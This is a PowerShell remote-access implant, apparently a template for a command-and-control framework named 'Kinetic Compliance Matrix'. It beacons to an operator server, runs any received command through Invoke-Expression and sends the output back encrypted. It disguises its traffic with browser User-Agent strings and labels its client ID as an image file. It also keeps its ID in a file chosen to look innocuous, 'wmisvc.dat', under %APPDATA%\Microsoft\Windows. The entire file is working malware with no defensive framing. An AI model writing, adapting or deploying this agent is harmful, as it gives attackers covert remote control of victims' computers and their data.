# Kinetic Compliance Matrix - Simplified PowerShell Agent

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Server details
$serverAddress = '{{SERVER_ADDRESS}}'

# Initial endpoint paths
$beaconPath = '{{BEACON_PATH}}'
$commandResultPath = '{{CMD_RESULT_PATH}}'

# Initialize encryption key as null - will be obtained from server
$global:encryptionKey = $null

# Initialize client ID storage
$global:clientId = $null

{{PATH_ROTATION_CODE}}

# Function to encrypt data for C2 communication
function Encrypt-Data {
    param([string]$PlainText)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return plaintext if no encryption key available yet
        return $PlainText
    }
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $global:encryptionKey
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($result)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return the data as-is if no encryption key available yet
        return $EncryptedBase64
    }
    
    try {
        # Decode base64
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        
        # Extract IV and ciphertext
        $iv = $encryptedBytes[0..15]
        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
        
        # Create AES decryptor
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.Key = $global:encryptionKey
        $aes.IV = $iv
        
        # Decrypt
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        
        # Remove padding
        $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
        $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
        
        # Convert to string
        return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
    }
    catch {
        # If decryption fails, it could be an initial exchange or invalid data
        # Just return the original input
        return $EncryptedBase64
    }
}

# Function to handle key issuance or rotation
function Update-EncryptionKey {
    param([string]$Base64Key)
    
    try {
        # Convert the Base64 key to a byte array
        $newKey = [System.Convert]::FromBase64String($Base64Key)
        
        # Set the global encryption key
        $global:encryptionKey = $newKey
        
        Write-Host "Encryption key updated successfully"
        return $true
    }
    catch {
        Write-Host "Error updating encryption key: $_"
        return $false
    }
}

# Function to generate a new client ID using the specified format
function New-ClientId {
    # Generate a random 5-character string using uppercase letters
    $random = -join ((65..90) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    # Append "-img.jpeg" to make it look like an image file
    $clientId = "$random-img.jpeg"
    return $clientId
}

# Function to gather simplified system identification information
function Get-SystemIdentification {
    # Gather only hostname and IP
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        IP = try {
            (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
        } catch {
            "Unknown"
        }
    }
    
    # Generate a unique client identifier or use existing one
    if ($global:clientId) {
        # Use existing client ID if we have one
        $systemInfo.ClientId = $global:clientId
    } else {
        # Generate a new client ID
        $global:clientId = New-ClientId
        $systemInfo.ClientId = $global:clientId
    }
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Convert to JSON
    $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
    return $jsonInfo
}

# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Execute based on command type
        try {
            $result = ""
            
            # Handle key issuance and rotation commands first
            if ($commandType -eq "key_issuance") {
                # Initial key setup from server
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
                
                # Send the result back to C2 - this will be the first encrypted communication
                $resultObj = @{
                    timestamp = $timestamp
                    result = $result
                    client_id = $global:clientId
                    system_info = Get-SystemIdentification
                }
                
                # First prepare the JSON
                $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                
                # Create a web client for result submission
                $resultClient = New-Object System.Net.WebClient
                
                # Add only standard headers for web browsing (no custom headers)
                $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $resultClient.Headers.Add("Content-Type", "application/json")
    
                # Try to send the result - with retry mechanism
                $maxRetries = 3
                $currentRetry = 0
                $sendSuccess = $false
                
                while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
                    try {
                        # Use the initial command result path
                        $resultUrl = "http://$serverAddress$commandResultPath"
                        Write-Host "Sending key issuance result to $resultUrl (attempt $($currentRetry+1))"
                        
                        # First try with unencrypted data
                        if ($currentRetry -eq 0) {
                            $resultClient.UploadString($resultUrl, $resultJson)
                        }
                        # On subsequent retries, try with encryption
                        else {
                            $encryptedResult = Encrypt-Data -PlainText $resultJson
                            $encryptedObj = @{
                                data = $encryptedResult
                                client_id = $global:clientId
                            }
                            $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                            $resultClient.UploadString($resultUrl, $encryptedJson)
                        }
                        
                        $sendSuccess = $true
                        Write-Host "Key issuance result sent successfully"
                    }
                    catch {
                        $currentRetry++
                        Write-Host "Error sending key issuance result (attempt $currentRetry): $_"
                        Start-Sleep -Seconds 1  # Brief pause before retry
                    }
                }
                
                # Continue to the next command
                continue
            }
            elseif ($commandType -eq "key_rotation") {
                # Handle key rotation command from operator
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
            }
            elseif ($commandType -eq "execute") {
                # Execute shell command
                try {
                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
                    Write-Host "Executing command: $args"
                    $result = Invoke-Expression -Command $args | Out-String
                    Write-Host "Command execution completed"
                }
                catch {
                    $result = "Error executing command: $_"
                    Write-Host $result
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    $paths = $rotationArgs.paths
                    
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $paths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                }
                catch {
                    $result = "Path rotation failed: $_"
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2
            $resultObj = @{
                timestamp = $timestamp
                result = $result
                client_id = $global:clientId
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            
            # Add only standard headers, no custom headers
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            
            # Create payload with encrypted data and client ID in plain text
            $payload = @{
                data = $encryptedResult
                client_id = $global:clientId
            }
            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
            
            Write-Host "Sending command result to $resultUrl"
            try {
                $resultClient.UploadString($resultUrl, $payloadJson)
                Write-Host "Command result sent successfully"
            }
            catch {
                Write-Host "Error sending command result: $_"
            }
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
                client_id = $global:clientId
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            
            # Add only standard headers, no custom headers
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            
            # Create payload with encrypted data and client ID in plain text
            $payload = @{
                data = $encryptedResult
                client_id = $global:clientId
            }
            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
            
            Write-Host "Sending error result to $resultUrl"
            try {
                $resultClient.UploadString($resultUrl, $payloadJson)
                Write-Host "Error result sent successfully"
            }
            catch {
                Write-Host "Error sending command error result: $_"
            }
        }
    }
}

# Function to check rotation times
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        # Will be handled on next beacon
        Write-Host "Rotation time reached, waiting for update from server..."
    }
}

# Function to handle server response data and update rotation info
function Process-ServerResponse {
    param($ResponseData)
    
    # Extract information from response
    $serverData = $ResponseData
    
    # Check for rotation information
    if ($global:pathRotationEnabled -and $serverData.rotation_info) {
        $rotationId = $serverData.rotation_info.current_rotation_id
        $nextRotation = $serverData.rotation_info.next_rotation_time
        
        if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
            # Server has newer rotation, we need to get paths
            Write-Host "Server has newer rotation ID: $rotationId (current: $global:currentRotationId)"
            $global:currentRotationId = [int]$rotationId
        }
        
        if ($nextRotation -and [int]$nextRotation -ne $global:nextRotationTime) {
            $global:nextRotationTime = [int]$nextRotation
            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:MM:ss'))"
        }
    }
    
    # Check for key operation status
    if ($serverData.first_contact -eq $true) {
        Write-Host "First contact with server established - key exchange in progress"
    }
    
    if ($serverData.key_issuance -eq $true) {
        Write-Host "Key issuance indicated in response"
    }
    
    if ($serverData.key_rotation -eq $true) {
        Write-Host "Key rotation indicated in response"
    }
}

# Create a persistent storage for client ID
function Save-ClientId {
    param([string]$ClientId)
    
    if (-not $ClientId) {
        return
    }
    
    try {
        # Create a storage location that's less detectable
        $storageDir = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows")
        if (-not (Test-Path $storageDir)) {
            New-Item -Path $storageDir -ItemType Directory -Force | Out-Null
        }
        
        # Store the client ID in an innocuous-looking file
        $storageFile = Join-Path $storageDir "wmisvc.dat"
        
        # Encrypt the client ID with simple obfuscation
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($ClientId)
        $encodedId = [Convert]::ToBase64String($bytes)
        
        # Save to file
        [System.IO.File]::WriteAllText($storageFile, $encodedId)
        
        Write-Host "Client ID saved to persistent storage"
    }
    catch {
        Write-Host "Warning: Unable to save client ID to persistent storage: $_"
    }
}

# Loads the client ID from persistent storage
function Load-ClientId {
    try {
        $storageFile = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows\wmisvc.dat")
        if (Test-Path $storageFile) {
            $encodedId = [System.IO.File]::ReadAllText($storageFile)
            $bytes = [Convert]::FromBase64String($encodedId)
            $clientId = [System.Text.Encoding]::UTF8.GetString($bytes)
            return $clientId
        }
    }
    catch {
        Write-Host "Warning: Unable to load client ID from persistent storage: $_"
    }
    return $null
}

# Main agent loop
function Start-AgentLoop {
    $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
    $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
    
    # Try to load previously stored client ID
    $loadedClientId = Load-ClientId
    if ($loadedClientId) {
        $global:clientId = $loadedClientId
        Write-Host "Loaded client ID from persistent storage: $global:clientId"
    } else {
        # Generate a new client ID
        $global:clientId = New-ClientId
        Write-Host "Generated new client ID: $global:clientId"
    }
    
    # Get system information for identification
    $systemInfo = Get-SystemIdentification
    
    # Extract client ID and hostname from system info
    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
    $clientId = $systemInfoObj.ClientId
    $hostname = $systemInfoObj.Hostname
    
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    $maxFailuresBeforeFallback = {{MAX_FAILURES}}
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            
            # Create web client for C2 communication
            $webClient = New-Object System.Net.WebClient
            
            # Add only standard headers to blend in with normal web traffic - no custom headers
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
            $webClient.Headers.Add("Content-Type", "application/json")
            
            # Get current beacon path based on rotation status
            $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
                Get-CurrentPath -PathType "beacon_path" 
            } else { 
                $beaconPath 
            }
            $beaconUrl = "http://$serverAddress$currentBeaconPath"
            
            # Prepare the system info data
            $systemInfoRaw = Get-SystemIdentification
            $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
            
            # Prepare the beacon payload - include client ID in plain text
            $beaconPayload = @{
                client_id = $global:clientId
                data = $encryptedSystemInfo
                rotation_id = if ($global:pathRotationEnabled) { $global:currentRotationId } else { 0 }
            }
            $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
            
            # Beacon to the C2 server
            Write-Host "[$hostname] Beaconing to $beaconUrl"
            $response = $webClient.UploadString($beaconUrl, "POST", $beaconJson)
            
            # Process response data
            $responseObject = ConvertFrom-Json -InputObject $response
            Process-ServerResponse -ResponseData $responseObject
            
            # Reset failure counter on successful connection
            $consecutiveFailures = 0
            $usingFallbackPaths = $false
            
            # Save client ID to persistent storage if it's new or changed
            if ($global:clientId -and ($global:clientId -ne $loadedClientId)) {
                Save-ClientId -ClientId $global:clientId
                $loadedClientId = $global:clientId
            }
            
            # Process response if it contains commands
            if ($responseObject.commands -and $responseObject.commands.Length -gt 0) {
                # Check for special flag that indicates first contact/key issuance
                $isFirstContact = $responseObject.first_contact -eq $true
                
                # If it's first contact, the commands are not encrypted
                if ($isFirstContact) {
                    # Process commands directly
                    Process-Commands -Commands $responseObject.commands
                }
                else {
                    # For established sessions, decrypt the commands if they're encrypted
                    if ($responseObject.encrypted -eq $true) {
                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObject.commands
                        try {
                            $commands = ConvertFrom-Json -InputObject $decryptedResponse
                            Process-Commands -Commands $commands
                        }
                        catch {
                            Write-Host "Error parsing decrypted response: $_"
                        }
                    }
                    else {
                        # Handle unencrypted commands
                        Process-Commands -Commands $responseObject.commands
                    }
                }
            }
        }
        catch {
            $errorMsg = $_.Exception.Message
            Write-Host "[$hostname] Error in beacon: $errorMsg"
            
            # Increment failure counter
            $consecutiveFailures++
            
            # If too many failures and using dynamic paths, try falling back to default paths
            if ($global:pathRotationEnabled -and $consecutiveFailures -ge $maxFailuresBeforeFallback -and -not $usingFallbackPaths) {
                Write-Host "[$hostname] Falling back to initial paths after $consecutiveFailures failures"
                $usingFallbackPaths = $true
            }
            
            # If still failing with fallback paths, increase the beacon interval temporarily
            if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
                # Exponential backoff with max of 5 minutes
                $backoffSeconds = [Math]::Min({{MAX_BACKOFF}}, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
                Write-Host "[$hostname] Connection issues persist, waiting $backoffSeconds seconds before retry"
                Start-Sleep -Seconds $backoffSeconds
                continue
            }
        }
        
        # Wait for next beacon interval
        Start-Sleep -Seconds $actualInterval
    }
}

# Start the agent
Start-AgentLoop